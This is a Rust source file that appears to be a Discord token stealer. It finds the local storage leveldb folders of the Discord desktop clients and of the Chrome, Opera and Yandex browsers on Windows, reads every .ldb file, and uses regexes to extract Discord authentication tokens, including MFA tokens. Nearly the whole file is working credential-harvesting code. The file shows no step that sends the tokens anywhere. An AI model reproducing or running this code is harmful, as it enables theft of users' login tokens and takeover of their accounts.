/* My old code, not updated or optimized */

extern crate regex;
extern crate encoding;
extern crate dirs;

use encoding::{Encoding, DecoderTrap};
use encoding::all::WINDOWS_1254;
use regex::{Regex, RegexBuilder};

use std::io;
use std::fs;
use std::io::prelude::*;
use std::str;


pub struct Discord {
    pub path_normal: String,
    pub path_canary: String,
    pub path_ptb: String,

    pub path_chrome: String,
    pub path_opera: String,
    pub path_yandex: String,
}

impl Discord {

    pub fn new() -> Discord {
        Discord {
            path_normal: "None".to_string(),
            path_canary: "None".to_string(),
            path_ptb: "None".to_string(),
            path_chrome: "None".to_string(),
            path_opera: "None".to_string(),
            path_yandex: "None".to_string()
        }
    }

    fn path_exists(path: String) -> Result<bool, String> {
        let metadata;
        match fs::metadata(path.as_str()) {
            Ok(t) => metadata = t,
            Err(_) => return Err(format!("Error: Path doesn't exists [{}]", path))
        }
        return if metadata.is_file() {
            Err(format!("Error: Path is a file, not a directory! [{}]", path))
        } else if metadata.is_dir() {
            Ok(true)
        } else {
            Err(format!("Error: Unknown error with path [{}]", path))
        }
    }

    fn path_exists_get(path: String) -> Result<String, ()> {
        let metadata;
        match fs::metadata(path.as_str()) {
            Ok(t) => metadata = t,
            Err(_) => return Err(())
        }
        return if metadata.is_file() {
            Err(())
        } else if metadata.is_dir() {
            Ok(path)
        } else {
            Err(())
        }
    }

    fn get_tokens_file(file: &str) -> io::Result<String> {
        let re_token_normal = Regex::new(r"([\w-]{24})\.([\w-]{6})\.([\w-]{27})").unwrap();
        let re_token_mfa = RegexBuilder::new(r#"mfa\.[\w-]{84}"#)
            .size_limit(20485760)
            .case_insensitive(true)
            .build()
            .unwrap();

        let mut buffer = Vec::new();
        let mut f = fs::File::open(file)?;
        f.read_to_end(&mut buffer)?;

        let data_str: &str;
        let data_string: String;
        match WINDOWS_1254.decode(&buffer, DecoderTrap::Strict) {
            Ok(t) => data_string = t.to_owned(),
            Err(_) => return Ok(String::from(""))
        }
        data_str = &data_string[..];

        let mut tokens: String = String::from("");
        for cap in re_token_normal.captures_iter(data_str) {
            tokens += &cap[0];
            tokens += "\n\n";
        } for cap in re_token_mfa.captures_iter(data_str) {
            tokens += &cap[0];
            tokens += "\n\n";
        }

        Ok(tokens)
    }

    fn return_tokens(path: String) -> Result<String, String> {

        match Discord::path_exists(path.clone()) {
            Ok(_) => (),
            Err(e) => return Err(e)
        }

        let mut tokens: String = String::from("");
        let dirs = fs::read_dir(path.clone().as_str()).unwrap();
        for dir in dirs {
            let dir_name = format!("{}", dir.unwrap().path().display());

            if dir_name.ends_with(".ldb") {
                match Discord::get_tokens_file(dir_name.as_str()) {
                    Ok(t) => tokens += t.as_str(),
                    Err(_) => tokens += ""
                }
            }
        }

        tokens.pop();
        Ok(tokens)
    }

    pub fn get_tokens(path: String) -> String {
        return match Discord::return_tokens(path) {
            Ok(tokens) => tokens,
            Err(e) => format!("Error: {}", e)
        }
    }

    // Maybe I should just return a vector and iterate over it??
    pub fn set_paths_app(&mut self) {

        let home_dir: String = dirs::home_dir().unwrap().to_str().unwrap().to_string();

        match Discord::path_exists_get(format!(r"{}\AppData\Roaming\discord\Local Storage\leveldb", home_dir)) {
            Ok(path) => self.path_normal = path,
            _ => ()
        }

        match Discord::path_exists_get(format!(r"{}\AppData\Roaming\discordcanary\Local Storage\leveldb", home_dir)) {
            Ok(path) => self.path_canary = path,
            _ => ()
        }

        match Discord::path_exists_get(format!(r"{}\AppData\Roaming\discordptb\Local Storage\leveldb", home_dir)) {
            Ok(path) => self.path_ptb = path,
            _ => ()
        }

    }

    pub fn set_paths_web(&mut self) {

        let home_dir: String = dirs::home_dir().unwrap().to_str().unwrap().to_string();

        match Discord::path_exists_get(format!(r"{}\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", home_dir)) {
            Ok(path) => self.path_chrome = path,
            _ => ()
        }

        match Discord::path_exists_get(format!(r"{}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb", home_dir)) {
            Ok(path) => self.path_yandex = path,
            _ => ()
        }

        match Discord::path_exists_get(format!(r"{}\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb", home_dir)) {
            Ok(path) => self.path_opera = path,
            _ => ()
        }

    }

}